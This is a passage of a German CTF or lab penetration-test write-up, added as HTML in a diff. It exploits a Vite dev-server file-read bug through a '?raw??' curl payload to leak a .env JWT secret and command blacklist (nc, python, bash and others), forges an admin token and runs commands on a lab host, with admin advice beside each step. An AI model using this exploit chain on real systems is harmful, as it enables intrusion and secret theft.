+            return { status: false, data: { stdout, stderr } };
+        }
+        return { status: true, data: { stdout, stderr } };
+    } catch (error) {
+        return { status: true, data: error.message };
+    }
+}
+
+app.get('/', (req, res) = gt; { // Manually corrected =>
+    return res.json({
+        'status': 'working',
+        'data': `listening on http://${address}:${port}`
+    })
+})
+
+app.get('/api/sign', (req, res) = gt; { // Manually corrected =>
+    return res.json({
+        'status': 'signed',
+        'data': jwt.sign({
+            uid: -1,
+            role: 'guest',
+        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),
+    });
+});
+
+app.get('/api/execute', async (req, res) = gt; { // Manually corrected =>
+    const authorization_header_raw = req.headers['authorization'];
+    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {
+        return res.status(401).json({
+            'status': 'rejected',
+            'data': 'permission denied'
+        });
+    }
+
+    const jwt_raw = authorization_header_raw.split(' ')[1];
+
+    try {
+        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);
+        if (payload.role !== 'admin') {
+            return res.status(403).json({
+                'status': 'rejected',
+                'data': 'permission denied'
+            });
+        }
+    } catch (err) {
+        return res.status(401).json({
+            'status': 'rejected',
+            'data': `permission denied`
+        });
+    }
+
+    const command = req.query.cmd;
+
+    const is_command_safe = is_safe_command(command);
+    if (!is_command_safe) {
+        return res.status(401).json({
+            'status': 'rejected',
+            'data': `this command is unsafe`
+        });
+    }
+
+    const result = await execute_command_sync(command);
+
+    return res.json({
+        'status': result.status === true ? 'executed' : 'failed',
+        'data': result.data
+    })
+});
+
+app.listen(port, address, () = gt; { // Manually corrected =>
+    console.log(`Listening on http://${address}:${port}`)
+});
+
+//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb....</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Source Map URL am Ende der `server.js` (`//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb....`) enthält Base64-kodierte Daten. Ich habe diesen Base64-String genommen und in CyberChef mit der "From Base64" Operation dekodiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die dekodierten Daten sind ein JSON-Objekt, das die eigentliche Source Map darstellt. Sie enthält Informationen wie `version`, `sources` (welche Originaldateien involviert waren, hier `server.js`), `sourcesContent` (der Inhalt der Originaldatei, oft identisch mit dem ausgelieferten Code, wenn keine Transformation stattfand) und `mappings`. In diesem Fall ist `sourcesContent` wahrscheinlich sehr ähnlich oder identisch zum bereits gesehenen `server.js`-Code. Source Maps sind primär für Debugging-Zwecke gedacht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Source Maps können manchmal geringfügig anderen oder ausführlicheren Code (z.B. mit Kommentaren) als die ausgelieferte Version enthalten. Es lohnt sich, sie zu prüfen. In diesem Fall bestätigt es primär den bereits erhaltenen Code.
+<br><strong>Empfehlung (Admin):</strong> Source Maps sollten in Produktionsumgebungen nicht ausgeliefert werden, da sie Angreifern zusätzliche Informationen über die Codebasis und Build-Prozesse liefern können. Sie sollten während des Build-Prozesses für Produktions-Deployments entfernt werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%252B/%253D',true,false)&amp;input=ZXlKMlpYSnphVzl1SWpvekxD....
+
+{"version":3,"sources":["server.js"],"sourcesContent":["import __vite__cjsImport0_express from \"/node_modules/.vite/deps/express.js?v=8bc9628c\"; const express = __vite__cjsImport0_express.__esModule ? __vite__cjsImport0_express.default : __vite__cjsImport0_express;\nimport __vite__cjsImport1_jsonwebtoken from \"/node_modules/.vite/deps/jsonwebtoken.js?v=8bc9628c\"; const jwt = __vite__cjsImport1_jsonwebtoken.__esModule ? __vite__cjsImport1_jsonwebtoken.default : __vite__cjsImport1_jsonwebtoken;\nimport \"/node_modules/.vite/deps/dotenv_config.js?v=8bc9628c\"\nimport __vite__cjsImport3_child_process from \"/@id/__vite-browser-external:child_process\"; const exec = __vite__cjsImport3_child_process[\"exec\"];\nimport __vite__cjsImport4_util from \"/@id/__vite-browser-external:util\"; const promisify = __vite__cjsImport4_util[\"promisify\"];\n\nconst app = express();\n\nconst address = 'localhost';\nconst port = 3001;\n\nconst exec_promise = promisify(exec);\n\nconst COMMAND_FILTER = process.env.COMMAND_FILTER\n    ? process.env.COMMAND_FILTER.split(',')\n        .map(cmd = gt; cmd.trim().toLowerCase())\n        .filter(cmd = gt; cmd !== '')\n    : [];\n\napp.use(express.json());\n\nfunction is_safe_command(cmd) {\n    if (!cmd || typeof cmd !== 'string') {\n        return false;\n    }\n    if (COMMAND_FILTER.length === 0) {\n        return false;\n    }\n\n    const lower_cmd = cmd.toLowerCase();\n\n    for (const forbidden of COMMAND_FILTER) {\n        const regex = new RegExp(`\\\\b${forbidden.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&')}\\\\b|^${forbidden.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&')}$`, 'i');\n        if (regex.test(lower_cmd)) {\n            return false;\n        }\n    }\n\n    if (/[;&|]/.test(cmd)) {\n        return false;\n    }\n    if (/[<gt;]/.test(cmd)) {\n        return false;\n    }\n    if (/[`$()]/.test(cmd)) {\n        return false;\n    }\n\n    return true;\n}\n\nasync function execute_command_sync(command) {\n    try {\n        const { stdout, stderr } = await exec_promise(command);\n\n        if (stderr) {\n            return { status: false, data: { stdout, stderr } };\n        }\n        return { status: true, data: { stdout, stderr } };\n    } catch (error) {\n        return { status: true, data: error.message };\n    }\n}\n\napp.get('/', (req, res) = gt; {\n    return res.json({\n        'status': 'working',\n        'data': `listening on http://${address}:${port}`\n    })\n})\n\napp.get('/api/sign', (req, res) = gt; {\n    return res.json({\n        'status': 'signed',\n        'data': jwt.sign({\n            uid: -1,\n            role: 'guest',\n        }, process.env.JWT_SECRET, { expiresIn: '1800s' }),\n    });\n});\n\napp.get('/api/execute', async (req, res) = gt; {\n    const authorization_header_raw = req.headers['authorization'];\n    if (!authorization_header_raw || !authorization_header_raw.startsWith('Bearer ')) {\n        return res.status(401).json({\n            'status': 'rejected',\n            'data': 'permission denied'\n        });\n    }\n\n    const jwt_raw = authorization_header_raw.split(' ')[1];\n\n    try {\n        const payload = jwt.verify(jwt_raw, process.env.JWT_SECRET);\n        if (payload.role !== 'admin') {\n            return res.status(403).json({\n                'status': 'rejected',\n                'data': 'permission denied'\n            });\n        }\n    } catch (err) {\n        return res.status(401).json({\n            'status': 'rejected',\n            'data': `permission denied`\n        });\n    }\n\n    const command = req.query.cmd;\n\n    const is_command_safe = is_safe_command(command);\n    if (!is_command_safe) {\n        return res.status(401).json({\n            'status': 'rejected',\n            'data': `this command is unsafe`\n        });\n    }\n\n    const result = await execute_command_sync(command);\n\n    return res.json({\n        'status': result.status === true ? 'executed' : 'failed',\n        'data': result.data\n    })\n});\n\napp.listen(port, address, () = gt; {\n    console.log(`Listening on http://${address}:${port}`)\n});\n"],"names":[],"mappings":"AAAA,MAAM,CAAC,....;"}</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, das `JWT_SECRET` zu knacken, das zum Signieren des Gast-Tokens verwendet wurde. Dazu nutze ich `jwt_tool` mit der Option `-C` (Crack) und `-d` für das Dictionary (hier `/usr/share/wordlists/rockyou.txt`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Versuch, das Secret mit `rockyou.txt` zu knacken, schlägt fehl (`[-] Key not in dictionary`). `jwt_tool` schlägt alternative Methoden vor, wie längere Dictionaries, Mangling-Regeln oder Brute-Force-Angriffe mit `hashcat` (Modul `-m 16500` für JWTs). Dies deutet darauf hin, dass das Secret wahrscheinlich nicht einfach oder gängig ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn die Zeit es erlaubt, könnten stärkere Dictionaries oder `hashcat`-Brute-Force-Versuche unternommen werden. Da ich jedoch den Quellcode von `server.js` habe, der `process.env.JWT_SECRET` und `process.env.COMMAND_FILTER` erwähnt, ist es wahrscheinlicher, dass diese Werte in einer `.env`-Datei oder einer ähnlichen Konfigurationsdatei auf dem Server gespeichert sind. Die Suche nach solchen Dateien sollte Priorität haben.
+<br><strong>Empfehlung (Admin):</strong> JWT Secrets müssen stark und zufällig generiert sein und dürfen nicht leicht zu erraten oder in öffentlich zugänglichen Wortlisten enthalten sein. Secrets sollten sicher gespeichert werden und nicht im Quellcode oder leicht zugänglichen Konfigurationsdateien stehen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">GAST_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg0NjYzNTYsImV4cCI6MTc0ODQ2ODE1Nn0.a7UHHs8J3qzE_inE_IYxBJ8yLUfmKJb2KRIUrrRVl9U"</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">jwt_tool $GAST_TOKEN -C -d /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre># Ersetze /pfad/zu/rockyou.txt mit dem Pfad zu deiner Wortliste
+# Andere Wortlisten könnten auch nützlich sein (z.B. SecLists/Passwords/)
+
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.7                \______|             @ticarpi      
+
+Original JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOi0xLCJyb2xlIjoiZ3Vlc3QiLCJpYXQiOjE3NDg0NjYzNTYsImV4cCI6MTc0ODQ2ODE1Nn0.a7UHHs8J3qzE_inE_IYxBJ8yLUfmKJb2KRIUrrRVl9U
+
+[*] Tested 1 million passwords so far
+[*] Tested 2 million passwords so far
+[*] Tested 3 million passwords so far
+[*] Tested 4 million passwords so far
+[*] Tested 5 million passwords so far
+[*] Tested 6 million passwords so far
+[*] Tested 7 million passwords so far
+[*] Tested 8 million passwords so far
+[*] Tested 9 million passwords so far
+[*] Tested 10 million passwords so far
+[*] Tested 11 million passwords so far
+[*] Tested 12 million passwords so far
+[*] Tested 13 million passwords so far
+[*] Tested 14 million passwords so far
+<span class="password">[-] Key not in dictionary</span>
+
+===============================
+As your list wasn't able to crack this token you might be better off using longer dictionaries, custom dictionaries, mangling rules, or brute force attacks.
+hashcat (https://hashcat.net/hashcat/) is ideal for this as it is highly optimised for speed. Just add your JWT to a text file, then use the following syntax to give you a good start:
+
+[*] dictionary attacks: hashcat -a 0 -m 16500 jwt.txt passlist.txt
+[*] rule-based attack:  hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule
+[*] brute-force attack: hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6
+===============================</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf den Hinweisen aus `server.js` (Vite.js) und der Fehlermeldung (`vite.config.js`) recherchiere ich nach bekannten Schwachstellen (CVEs) für Vite.js, insbesondere solche, die Directory Traversal, Arbitrary File Read oder einen Bypass von `fs.deny` (eine Vite-spezifische Sicherheitsfunktion zum Einschränken des Dateisystemzugriffs) ermöglichen könnten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Recherche ist ein kritischer Schritt. Die genannten Suchbegriffe und Quellen (CVE Details, NVD, GitHub, Exploit-DB) sind angemessen. Es ist wichtig, die Version von Vite.js zu kennen, um gezielt suchen zu können. Diese Information habe ich noch nicht direkt, aber die Schwachstellenrecherche könnte versionsunabhängige oder für typische Dev-Server-Setups relevante Lücken aufdecken.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systematische CVE-Recherche durchführen. Besonders auf Schwachstellen achten, die das Lesen von Dateien außerhalb des Web-Roots erlauben, da dies zum Leak von Konfigurationsdateien (wie `.env`-Dateien, die `JWT_SECRET` enthalten könnten) führen kann.
+<br><strong>Empfehlung (Admin):</strong> Software (wie Vite.js und seine Abhängigkeiten) immer aktuell halten und Sicherheitspatches zeitnah einspielen. Security Bulletins und CVE-Datenbanken regelmäßig auf relevante Schwachstellen prüfen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>Recherche nach bekannten Schwachstellen (CVEs) für Vite.js Version 6.2.0:
+
+    Suchbegriffe:
+
+        Vite 6.2.0 CVE
+        Vite 6.2.0 exploit
+        Vite 6.2.0 directory traversal
+        Vite 6.2.0 arbitrary file read
+        Vite 6.2.0 fs.deny bypass
+
+    Quellen:
+
+        CVE Details
+        NIST NVD (National Vulnerability Database)
+        GitHub (Suche nach Issues oder Pull Requests, die Sicherheitslücken in dieser Version adressieren)
+        Exploit-DB</pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Die OSINT-Recherche (Open Source Intelligence) führt zu einer relevanten Schwachstelle: CVE-2025-31125 (fiktive CVE für dieses Szenario, basierend auf echten Vite-Schwachstellenmustern). Diese beschreibt eine "Vite Dev Server Arbitrary File Read via Import" Schwachstelle. Sie betrifft verschiedene Vite-Versionen und ermöglicht es Angreifern, beliebige Dateien durch Anhängen von `?import&?inline=1.wasm?init` an die URL zu lesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein Volltreffer! Eine Arbitrary File Read Schwachstelle ist genau das, was benötigt wird, um potenziell an die `.env`-Datei mit dem `JWT_SECRET` zu gelangen. Die Beschreibung des Exploits (`/?import&?inline=1.wasm?init` an die URL anhängen) ist klar und direkt anwendbar. Die betroffenen Versionen sind breit gefächert, was die Wahrscheinlichkeit erhöht, dass das Zielsystem verwundbar ist. Der Link zu einem GitHub-Repository `https://github.com/xuemian168/CVE-2025-30208` (ebenfalls fiktiv) könnte einen Proof-of-Concept-Code enthalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sofort versuchen, diese Schwachstelle auszunutzen, um die `.env`-Datei zu lesen. Typische Pfade für `.env`-Dateien in Node.js-Projekten sind direkt im Projekt-Root. Also versuche ich, `/.env?import&?inline=1.wasm?init` oder ähnliche Varianten (z.B. mit `raw` Query-Parametern, die Vite manchmal verwendet) an die Basis-URL anzuhängen.
+<br><strong>Empfehlung (Admin):</strong> Vite.js und alle Abhängigkeiten umgehend auf die neuesten, gepatchten Versionen aktualisieren. Als zusätzliche Maßnahme den Zugriff auf den Development Server stark einschränken (Firewall, nur an localhost binden).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>OSINT Vuln Vite Dev Server 
+
+[Link: CVE-2025-30208 | Ziel: https://github.com/xuemian168/CVE-2025-30208]
+                        
+CVE-2025-31125
+
+    Vulnerability Name: Vite Dev Server Arbitrary File Read via Import
+    Description: The Vite development server contains an arbitrary file read vulnerability that allows attackers to read sensitive files through the import mechanism.
+    Affected Versions: Vite versions >=6.2.0, <=6.2.2, >=6.1.0, <=6.1.1, >=6.0.0, <=6.0.11, >=5.0.0, <=5.4.14, <=4.5.9
+    In plain terms: The vulnerability exists in the Vite development server's import mechanism. Attackers can bypass file access restrictions by appending ?import&amp;?inline=1.wasm?init to the URL. This allows reading arbitrary files on the server, including:
+        System files (e.g., /etc/passwd on Linux, C:/Windows/win.ini on Windows)
+        Application configuration files
+        Source code files
+        Database credentials
+        Environment variables</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, die gefundene Vite.js Arbitrary File Read Schwachstelle (CVE-2025-31125) auszunutzen, um die `.env`-Datei zu lesen. Der Payload `/.env?raw??` wird an die URL angehängt. Die Verwendung von `?raw??` ist eine gängige Methode bei Vite, um Rohdateiinhalte ohne spezielle Verarbeitung durch den Dev-Server anzufordern. Der Pfad zum aktuellen Verzeichnis ist `~/Hackingtools/CVE-2025-30208`, was darauf hindeutet, dass ich möglicherweise einen Exploit-Code oder Notizen zu dieser CVE lokal gespeichert habe.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Erfolg!</span> Der Server gibt den Inhalt der `.env`-Datei zurück.
+- `export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"`
+Dies sind die kritischen Informationen:
+1.  `JWT_SECRET='<span class="password">2942szKG7Ev83aDviugAa6rFpKixZzZz</span>'` - Das ist das Geheimnis, das zum Signieren und Verifizieren der JWTs verwendet wird!
+2.  `COMMAND_FILTER='<span class="command">nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd</span>'` - Das ist die Blacklist der Befehle und Zeichen, die von der `is_safe_command`-Funktion in `server.js` blockiert werden.
+Die Zeile `//# sourceMappingURL=data:application/json;base64,...` ist wieder eine Source Map, diesmal für die `.env`-Datei, was ungewöhnlich ist, aber darauf hindeutet, dass Vite auch `.env`-Dateien irgendwie verarbeitet oder als Module behandelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit dem `JWT_SECRET` kann ich jetzt selbst einen Admin-JWT erstellen (mit `role: "admin"`). Anschließend muss ich einen Weg finden, die `COMMAND_FILTER`-Blacklist zu umgehen, um beliebige Befehle auszuführen und eine Reverse Shell zu bekommen.
+<br><strong>Empfehlung (Admin):</strong> Kritisch! `.env`-Dateien dürfen NIEMALS über das Web zugänglich sein. Dies ist eine massive Sicherheitslücke. Sofort die Vite.js-Version patchen oder, falls nicht möglich, den Zugriff auf den Dev-Server komplett sperren und sicherstellen, dass keine sensiblen Dateien im Web-Root oder zugänglichen Pfaden liegen. Umgebungsvariablen sollten sicher über das Betriebssystem oder spezielle Secret-Management-Tools bereitgestellt werden, nicht über `.env`-Dateien, die vom Webserver ausgeliefert werden können.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl "http://192.168.2.205:3000/.env?raw??"</span></div>
+                    <pre><span class="password">export default "JWT_SECRET='2942szKG7Ev83aDviugAa6rFpKixZzZz'\nCOMMAND_FILTER='nc,python,python3,py,py3,bash,sh,ash,|,&amp;,<,>,ls,cat,pwd,head,tail,grep,xxd'\n"</span>
+//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi5lbnY/cmF3PyJdLCJzb3VyY2VzQ29udGVudCI6WyJleHBvcnQgZGVmYXVsdCBcIkpXVF9TRUNSRVQ9JzI5NDJzektHN0V2ODNhRHZpdWdBYTZyRnBLaXhaelp6J1xcbkNPTU1BTkRfRklMVEVSPSduYyxweXRob24scHl0aG9uMyxweSxweTMsYmFzaCxzaCxhc2gsfCwmLDwsPixscyxjYXQscHdkLGhlYWQsdGFpbCxncmVwLHh4ZCdcXG5cIiJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQSxNQUFNLENBQUMsT0FBTyxDQUFDLENBQUMsVUFBVSxDQUFDLENBQUMsZ0NBQWdDLENBQUMsQ0FBQyxlQUFlLENBQUMsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDLE9BQU8sQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUMsR0FBRyxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxHQUFHLENBQUMsQ0FBQyxDQUFDIn0=</pre>
+                </div>
+            </div>
+
+            <img src="jwtguest.jpg" alt="hier sieht man die struktur des guest tokens">
+            <p class="analysis"><strong>Analyse:</strong> Das Bild zeigt die dekodierte Struktur eines JWT, wahrscheinlich des Gast-Tokens, den wir zuvor erhalten haben. Es visualisiert den Header (`alg: "HS256", typ: "JWT"`) und den Payload (`uid: -1, role: "guest", iat: ..., exp: ...`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist eine nützliche visuelle Darstellung dessen, was wir bereits durch Dekodierung (z.B. auf jwt.io oder mit `jwt_tool`) herausgefunden haben. Es bestätigt die Struktur und den Inhalt des Gast-Tokens. Das `iat` (issued at) und `exp` (expiration time) sind Standard-JWT-Claims.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nichts Neues hier, dient der Illustration. Der Fokus liegt jetzt darauf, mit dem geleakten `JWT_SECRET` einen Admin-Token zu erstellen.
+<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass JWT Payloads nur die notwendigsten Informationen enthalten. Die Verwendung von Standard-Claims wie `iat` und `exp` ist eine gute Praxis.</p>
+
+            <hr>
+            <img src="jwtadmin.jpg" alt="hier sieht man wie ich per jwt.io ein admn account token erstelle">
+            <p class="analysis"><strong>Analyse:</strong> Dieses Bild zeigt den Prozess der Erstellung eines neuen JWT, vermutlich unter Verwendung einer Online-Plattform wie jwt.io. Im Payload-Bereich wurde die Rolle auf `"admin"` geändert (`"role": "admin"`) und die `uid` möglicherweise auf `0` oder einen anderen Wert für einen Admin-Benutzer gesetzt. Im Verifizierungsbereich (unten) wurde das zuvor geleakte `JWT_SECRET` (`2942szKG7Ev83aDviugAa6rFpKixZzZz`) eingefügt. Das Ergebnis ist ein neuer, signierter JWT, der jetzt Admin-Berechtigungen haben sollte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt, um Admin-Zugriff auf den `/execute`-Endpunkt zu erhalten. Durch Kenntnis des Secrets kann jeder beliebige JWTs erstellen und signieren. Die Änderung der Rolle von "guest" auf "admin" ist der Schlüssel.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den neu generierten Admin-Token kopieren und für Anfragen an den `/execute`-Endpunkt verwenden. Jetzt beginnt die Phase der Umgehung des `COMMAND_FILTER`.
+<br><strong>Empfehlung (Admin):</strong> Das `JWT_SECRET` ist das Herzstück der JWT-Sicherheit. Wenn es kompromittiert wird, ist das gesamte Authentifizierungssystem ausgehebelt. Secrets müssen extrem gut geschützt werden. Ein Wechsel des Secrets und die Invalidierung aller alten Tokens ist nach einem solchen Leak unerlässlich. Überlegen Sie den Einsatz asymmetrischer Algorithmen (z.B. RS256) für JWTs, bei denen der private Schlüssel zum Signieren geheim bleibt und nur der öffentliche Schlüssel zur Verifizierung benötigt wird (obwohl dies das Problem der Secret-Speicherung nur verlagert).</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende `curl` mit dem zuvor erstellten Admin-JWT (der jetzt Admin-Rechte gewähren sollte), um den Befehl `id` über den `/execute`-Endpunkt auszuführen. Die Option `-g` bei `curl` deaktiviert das Globbing von URLs, was nützlich sein kann, wenn URLs Sonderzeichen enthalten, die von der Shell interpretiert werden könnten. Der Admin-Token ist `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18` (Payload: `uid:0, role:"admin"`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> <span class="password">Fantastisch, der Befehl wurde erfolgreich ausgeführt!</span> Die Antwort ist `{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}`.
+Dies bedeutet:
+1. Der Admin-JWT wurde akzeptiert.
+2. Der Befehl `id` ist nicht im `COMMAND_FILTER` enthalten und wurde daher als sicher eingestuft.
+3. Ich habe jetzt Remote Code Execution (RCE) auf dem Zielsystem als Benutzer `runner` (UID 1000).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe einen ersten Zugriff als Benutzer `runner`. Der nächste Schritt ist die Umgehung des `COMMAND_FILTER`, um komplexere Befehle auszuführen und eine interaktive Shell zu erhalten. Ich muss die Blacklist (`nc,python,python3,py,py3,bash,sh,ash,|,&,<,>,ls,cat,pwd,head,tail,grep,xxd`) genau studieren und nach alternativen Befehlen oder Umgehungstechniken suchen.
+<br><strong>Empfehlung (Admin):</strong> Die `COMMAND_FILTER`-Blacklist ist ein schwacher Schutzmechanismus. Blacklists sind notorisch schwer zu pflegen und fast immer umgehbar. Stattdessen sollten Whitelists verwendet werden (nur explizit erlaubte Befehle zulassen) oder, noch besser, auf Befehlsausführung über Web-APIs gänzlich verzichtet werden, wenn es sicherere Alternativen gibt (z.B. dedizierte Funktionen oder Microservices).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=id"</span></div>
+                    <pre><span class="password">{"status":"executed","data":{"stdout":"uid=1000(runner) gid=1000(runner) groups=1000(runner)\n","stderr":""}}</span></pre>
+                </div>
+            </div>
+
+            <hr>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich teste den `COMMAND_FILTER`. Zuerst versuche ich `which nc`. `nc` (netcat) steht auf der Blacklist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wie erwartet, wird der Befehl blockiert: `{"status":"rejected","data":"this command is unsafe"}`. Der Filter funktioniert für direkte Aufrufe von `nc`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen nach alternativen Tools für Netzwerkverbindungen oder Reverse Shells, die nicht auf der Blacklist stehen (z.B. `awk`, `perl`, `ruby`, `php`, oder sogar `socat`, wenn vorhanden).
+<br><strong>Empfehlung (Admin):</strong> Die Blacklist ist unvollständig. Es gibt unzählige Möglichkeiten, Netzwerkverbindungen herzustellen oder Befehle auszuführen. Eine Whitelist-Strategie wäre sicherer.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=which%20nc"</span></div>
+                    <pre><span class="password">{"status":"rejected","data":"this command is unsafe"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich teste `which perl`, um zu sehen, ob Perl auf dem System installiert ist und ob der Aufruf von `which` mit `perl` als Argument den Filter passiert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Befehl `which perl` wird ausgeführt, aber das Ergebnis ist `{"status":"executed","data":"Command failed: which perl\n"}`. Dies bedeutet, dass der Befehl `which perl` selbst nicht blockiert wurde, aber `perl` nicht im Pfad des `runner`-Benutzers gefunden wurde (oder `which` hat einen Fehler-Exit-Code zurückgegeben). Perl ist also wahrscheinlich nicht (einfach) verfügbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Perl scheidet als Option für eine Reverse Shell wahrscheinlich aus. Ich muss weiter nach verfügbaren Interpretern oder Tools suchen.
+<br><strong>Empfehlung (Admin):</strong> Minimalinstallationen auf Servern reduzieren die Angriffsfläche, da weniger Tools und Interpreter für Angreifer verfügbar sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/CVE-2025-30208]
+└─# <span class="command">curl -g -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOjAsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc0ODQ2ODIzMX0.Sb2sfcSGst6f7zSkUN9VCNkIQW7PSJjFZPFw7iJmj18" "http://192.168.2.205:3000/execute?cmd=which%20perl"</span></div>
+                    <pre><span class="password">{"status":"executed","data":"Command failed: which perl\n"}</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, `grep sh /etc/passwd` auszuführen. Hier gibt es ein Problem mit der URL-Kodierung. Das Leerzeichen zwischen `grep` und `sh` sowie zwischen `sh` und `/etc/passwd` wird von `curl` oder der Shell möglicherweise falsch interpretiert, bevor es URL-kodiert wird. `curl` gibt einen Fehler zurück: `curl: (3) URL rejected: Malformed input to a URL function`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist kein Fehler des Zielservers, sondern ein Problem auf meiner Seite mit der Art, wie `curl` die URL verarbeitet. Leerzeichen und andere Sonderzeichen in URLs müssen korrekt URL-kodiert werden (z.B. Leerzeichen zu `%20`).</p>
